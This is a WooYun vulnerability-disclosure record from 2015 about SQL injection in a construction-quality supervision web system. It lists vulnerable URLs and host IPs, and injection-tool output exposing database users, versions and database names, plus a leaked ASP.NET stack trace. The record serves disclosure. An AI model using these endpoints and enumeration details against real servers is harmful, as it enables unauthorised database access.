{"id": 29792, "wybug_id": "wooyun-2015-0118267", "wybug_title": "某建设工程质量监督系统SQL通用漏洞 涉及部分市", "wybug_corp": "某建设工程质量监督系统", "wybug_author": "雅柏菲卡", "wybug_date": "2015-06-05 14:45", "wybug_open_date": "2015-09-06 00:00", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向公众公开  简要描述： .......... 详细说明：  ....................   漏洞证明：  \n1、Target: \t\thttp://www.lwjczx.com/newsl.aspx?key=1Host IP:\t\t122.228.177.114Web Server: \tMicrosoft-IIS/6.0Powered-by: \tASP.NETDB Server: \tMsSQL with errorResp. Time(avg):\t3345 msCurrent User: \tdboCurrent DB: \twebSystem User: \tsaHost Name: \tIBMSERVERServer Name: \tIBMSERVER\t\twebData Bases: \tmaster\t\ttempdb\t\tmodel\t\tmsdb\t\tReportServer\t\tReportServerTempDB\t\tweblab\t\tweb\t\tjzqygl\t\ttest\t\tweblab_old\t\tweblab_tmp2、Target: \t\thttp://www.jxjgjc.com/newsl.aspx?key=1Host IP:\t\t122.225.52.126Web Server: \tMicrosoft-IIS/6.0Powered-by: \tASP.NETDB Server: \tMSSQL no errorResp. Time(avg):\t1169 msCurrent User: \tbdsaSql Version: \tMicrosoft SQL Server 2005 - 9.00.5000.00 (Intel X86) <br>\tDec 10 2010 10:56:29 <br>\tCopyright (c) 1988-2005 Microsoft Corporation<br>\tDeveloper Edition on Windows NT 5.2 (Build 3790: Service Pack 1)<br>Current DB: \tweb_newSystem User: \tbdsaHost Name: \tJXJGJCWEBServer Name: \tJXSERVERData Bases: \tmaster\t\ttempdb\t\tmodel\t\tmsdb\t\tReportServer\t\tReportServerTempDB\t\tweblab\t\tweblabOLD\t\tweb\t\tweb_new\t\twhrsm\t\tweb_xh\t\tbbs\t\tjxkq3、Target: \t\thttp://www.cfjsgcgl.com/newsl.aspx?key=1Host IP:\t\t124.67.252.48Web Server: \tMicrosoft-IIS/6.0Powered-by: \tASP.NETDB Server: \tMsSQL with errorResp. Time(avg):\t1052 msCurrent User: \tbdsoftCurrent DB: \tweb_jsHost Name: \tCF\t\tweb_jsData Bases: \tmaster\t\ttempdb\t\tmodel\t\tmsdb\t\tcs\t\tdqjg_2011\t\tdqjg_2012_1\t\tdqjg_2012_2\t\tdqjg\t\tfhys\t\tjzqygl\t\toa\t\tums\t\tweb\t\tweb_js\t\tjcoa4、Target: \t\thttp://www.wenchenggcjc.com/newsl.aspx?key=1Host IP:\t\t122.228.165.130Web Server: \tMicrosoft-IIS/7.0Powered-by: \tASP.NETDB Server: \tMsSQL with errorResp. Time(avg):\t834 msCurrent User: \tdboSql Version: \tMicrosoft SQL Server 2005 - 9.00.5000.00 (Intel X86) <br>\tDec 10 2010 10:56:29 <br>\tCopyright (c) 1988-2005 Microsoft Corporation<br>\tDeveloper Edition on Windows NT 6.0 (Build 6001: Service Pack 1)<br>' 转换成数据类型 int 时失败。</title>        <style>         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;}          p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }         pre {font-family:\"Lucida Console\";font-size: .9em}         .marker {font-weight: bold; color: black;text-decoration: none;}         .version {color: gray;}         .error {margin-bottom: 10px;}         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }        </style>    </head>    <body bgcolor=\"white\">            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>            <h2> <i>在将 nvarchar 值 'Microsoft SQL Server 2005 - 9.00.5000.00 (Intel X86) <br>\tDec 10 2010 10:56:29 <br>\tCopyright (c) 1988-2005 Microsoft Corporation<br>\tDeveloper Edition on Windows NT 6.0 (Build 6001: Service Pack 1)<br>' 转换成数据类型 int 时失败。</i> </h2></span>            <font face=\"Arial, Helvetica, Geneva, SunSans-Regular, sans-serif \">            <b> 说明: </b>执行当前 Web 请求期间，出现未处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。            <br><br>            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'Microsoft SQL Server 2005 - 9.00.5000.00 (Intel X86) <br>\tDec 10 2010 10:56:29 <br>\tCopyright (c) 1988-2005 Microsoft Corporation<br>\tDeveloper Edition on Windows NT 6.0 (Build 6001: Service Pack 1)<br>' 转换成数据类型 int 时失败。<br><br>            <b>源错误:</b> <br><br>            <table width=100% bgcolor=\"#ffffcc\">               <tr>                  <td>                      <code>执行当前 Web 请求期间生成了未处理的异常。可以使用下面的异常堆栈跟踪信息确定有关异常原因和发生位置的信息。\n                  </td>               </tr>            </table>            <br>            <b>堆栈跟踪:</b> <br><br>            <table width=100% bgcolor=\"#ffffcc\">               <tr>                  <td> \n<pre>[SqlException (0x80131904): 在将 nvarchar 值 'Microsoft SQL Server 2005 - 9.00.5000.00 (Intel X86) \tDec 10 2010 10:56:29 \tCopyright (c) 1988-2005 Microsoft Corporation\tDeveloper Edition on Windows NT 6.0 (Build 6001: Service Pack 1)' 转换成数据类型 int 时失败。]   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +925466   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection) +800118   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj) +186   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1932   System.Data.SqlClient.SqlDataReader.HasMoreRows() +150   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +212   System.Data.SqlClient.SqlDataReader.NextResult() +162   web.dbsql.QueryControllers.CommonPage(String sql, Int32 pageSize, Int32 pageIndex, Int32&amp; totalCount) in E:\\Napoleon\\Asp.net\\Webform\\Work\\标点\\文成\\网站\\dbsql\\QueryControllers.cs:30   web.dbsql.QueryControllers.SearchNews(String title, String ischeck, String category, String important, Int32 pageSize, Int32 pageIndex, Int32&amp; totalCount) in E:\\Napoleon\\Asp.net\\Webform\\Work\\标点\\文成\\网站\\dbsql\\QueryControllers.cs:298   web.busyness.NewsService.SearchNews(String title, String ischeck, String category, String important, Int32 pageSize, Int32 pageIndex, Int32&amp; totalCount) in E:\\Napoleon\\Asp.net\\Webform\\Work\\标点\\文成\\网站\\busyness\\NewsService.cs:166   web.web.newsl.Page_Load(Object sender, EventArgs e) in E:\\Napoleon\\Asp.net\\Webform\\Work\\标点\\文成\\网站\\web\\newsl.aspx.cs:34   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +15   System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) +33   System.Web.UI.Control.OnLoad(EventArgs e) +99   System.Web.UI.Control.LoadRecursive() +47   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +1436</pre>\n                  </td>               </tr>            </table>            <br>            <hr width=100% size=1 color=silver>            <b>版本信息:</b>&nbsp;Microsoft .NET Framework 版本:2.0.50727.1434; ASP.NET 版本:2.0.50727.1434            </font>    </body></html><!-- [SqlException]: 在将 nvarchar 值 'Microsoft SQL Server 2005 - 9.00.5000.00 (Intel X86) \tDec 10 2010 10:56:29 \tCopyright (c) 1988-2005 Microsoft Corporation\tDeveloper Edition on Windows NT 6.0 (Build 6001: Service Pack 1)System User: \tsaHost Name: \tWIN-AKIQVLPTGSP\t\twebData Bases: \tmaster\t\ttempdb\t\tmodel\t\tmsdb\t\tweblab\t\toa\t\tweblab_ra\t\tweb5、http://61.164.138.46:82/newsl.aspx?key=111\n\n</code>   修复方案：  ......................   版权声明：转载请注明来源 雅柏菲卡@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-06-05 18:15 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}